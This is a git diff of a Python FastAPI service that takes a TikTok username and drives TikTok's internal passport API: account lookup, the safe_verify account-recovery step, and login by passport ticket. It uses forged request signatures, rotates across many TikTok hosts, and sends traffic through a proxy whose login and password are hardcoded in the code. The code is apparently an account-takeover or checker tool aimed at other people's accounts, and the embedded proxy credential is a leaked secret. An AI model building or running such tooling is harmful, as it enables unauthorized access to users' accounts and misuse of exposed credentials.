@@ -1,6 +1,5 @@
 from fastapi import FastAPI
-from fastapi import Query
-from pydantic import BaseModel
+from fastapi.responses import JSONResponse
 import requests
 import time
 import random
@@ -9,28 +8,23 @@ import SignerPy
 
 app = FastAPI()
 
-# =========================
-# REQUEST MODEL
-# =========================
-class UserRequest(BaseModel):
-    username: str
-
 
 # =========================
-# MAIN CLASS
+# TikTokFlow (نفس كودك 100%)
 # =========================
 class TikTokFlow:
     def __init__(self, username):
         self.username = username.strip()
         self.session = requests.Session()
 
+        # 🔥 البروكسي
         proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
         self.proxy_dict = {
             "http": f"http://{proxy}",
             "https": f"http://{proxy}"
         }
 
-        # 🔥 HOSts (كلها كما طلبت بدون حذف)
+        # 🔥 كل الهوستات (بدون حذف)
         self.hosts = [
             "api16-core-aion-useast5.us.tiktokv.com","api16-core-apix-quic.tiktokv.com",
             "api16-core-apix.tiktokv.com","api16-core-baseline.tiktokv.com",
@@ -102,9 +96,6 @@ class TikTokFlow:
             'User-Agent': f'com.zhiliaoapp.musically/{self.base_params["manifest_version_code"]} (Linux; Android 10)'
         }
 
-    # =========================
-    # SIGN
-    # =========================
     def build_headers(self, params):
         sig = SignerPy.sign(params=params)
         headers = self.headers.copy()
@@ -125,50 +116,56 @@ class TikTokFlow:
         p['_rticket'] = int(ts * 1000)
         return p
 
-    # =========================
-    # LOOKUP
-    # =========================
+    # ========= LOOKUP =========
     def get_ticket(self):
         for host in self.hosts:
             params = self.fresh_params()
             params["account_param"] = self.username
 
             try:
+                headers = self.build_headers(params)
+                headers['x-tt-passport-csrf-token'] = secrets.token_hex(16)
+
                 r = self.session.post(
                     f"https://{host}/passport/account_lookup/username/",
-                    params=params,
-                    headers=self.build_headers(params),
-                    proxies=self.proxy_dict,
-                    timeout=5
+                    params=params, headers=headers,
+                    proxies=self.proxy_dict, timeout=5
                 )
+
+                print(f"\n🔥 LOOKUP [{host}]")
+                print("Body:", r.text[:1000])
 
                 j = r.json()
                 acc = j.get("data", {}).get("accounts", [])
-
                 if not acc:
                     continue
 
                 acc = acc[0]
-                return acc.get("passport_ticket"), acc.get("oauth_login_only", False)
+                return (
+                    acc.get("passport_ticket") or acc.get("not_login_ticket"),
+                    acc.get("oauth_login_only", False)
+                )
 
             except:
                 continue
 
         return None, None
 
-    # =========================
-    # SAFE
-    # =========================
+    # ========= SAFE =========
     def safe(self, ticket):
         for host in self.hosts:
+            params = self.fresh_params()
+            params["not_login_ticket"] = ticket
+            params["target"] = "recover_account"
+
             try:
                 r = self.session.get(
                     f"https://{host}/passport/shark/safe_verify/",
-                    params=self.fresh_params() | {"not_login_ticket": ticket},
-                    headers=self.build_headers(self.fresh_params()),
-                    proxies=self.proxy_dict,
-                    timeout=5
+                    params=params, headers=self.build_headers(params),
+                    proxies=self.proxy_dict, timeout=5
                 )
+
+                print(f"[SAFE {host}] -> {r.text}")
 
                 if '"error_code":2029' in r.text:
                     return True
@@ -178,19 +175,20 @@ class TikTokFlow:
 
         return False
 
-    # =========================
-    # AUTH
-    # =========================
+    # ========= AUTH =========
     def auth(self, ticket):
         for host in self.hosts:
+            params = self.fresh_params()
+            params["not_login_ticket"] = ticket
+
             try:
                 r = self.session.get(
                     f"https://{host}/passport/auth/available_ways/",
-                    params=self.fresh_params() | {"not_login_ticket": ticket},
-                    headers=self.build_headers(self.fresh_params()),
-                    proxies=self.proxy_dict,
-                    timeout=5
+                    params=params, headers=self.build_headers(params),
+                    proxies=self.proxy_dict, timeout=5
                 )
+
+                print(f"[AUTH {host}] -> {r.text}")
 
                 if '"message":"success"' in r.text:
                     return True
@@ -200,67 +198,54 @@ class TikTokFlow:
 
         return False
 
-    # =========================
-    # LOGIN
-    # =========================
+    # ========= LOGIN =========
     def login(self, ticket):
         for host in self.hosts:
+            params = self.fresh_params()
+            params["passport_ticket"] = ticket
+
             try:
                 r = self.session.post(
                     f"https://{host}/passport/user/login_by_passport_ticket/",
-                    params=self.fresh_params() | {"passport_ticket": ticket},
-                    headers=self.build_headers(self.fresh_params()),
-                    proxies=self.proxy_dict,
-                    timeout=5
+                    params=params, headers=self.build_headers(params),
+                    proxies=self.proxy_dict, timeout=5
                 )
 
-                print(f"[LOGIN {host}]")
-                print("HEADERS:", dict(r.headers))
-                print("RESPONSE:", r.text)
+                print(f"\n🔥 LOGIN [{host}]")
+                print("Headers:", dict(r.headers))
+                print("Body:", r.text)
 
-                return r.text
+                if '"error_code":2135' in r.text:
+                    return True
 
             except:
                 continue
 
-        return None
+        return False
 
-    # =========================
-    # FLOW
-    # =========================
+    # ========= FLOW =========
     def run(self):
         ticket, oauth = self.get_ticket()
 
         if not ticket:
             return {"error": "no_ticket"}
 
-        # 🔥 الحالة الجديدة اللي طلبتها
+        print("🎫 Ticket:", ticket)
+        print("🔐 AUTH:", oauth)
+
         if not oauth:
-            return {
-                "mode": "login",
-                "result": self.login(ticket)
-            }
+            return {"mode": "login", "result": self.login(ticket)}
 
-        safe_ok = self.safe(ticket)
+        if self.safe(ticket):
+            return {"mode": "auth", "result": self.auth(ticket)}
 
-        if safe_ok:
-            auth_ok = self.auth(ticket)
-            return {
-                "mode": "auth_flow",
-                "safe": safe_ok,
-                "auth": auth_ok
-            }
-
-        return {
-            "error": "flow_failed"
-        }
+        return {"error": "flow_failed"}
 
 
 # =========================
-# API ROUTE
-# ========================
-
+# FASTAPI ENDPOINT
+# =========================
 @app.get("/check")
-def check_user(username: str = Query(...)):
+def check(username: str):
     flow = TikTokFlow(username)
     return flow.run()
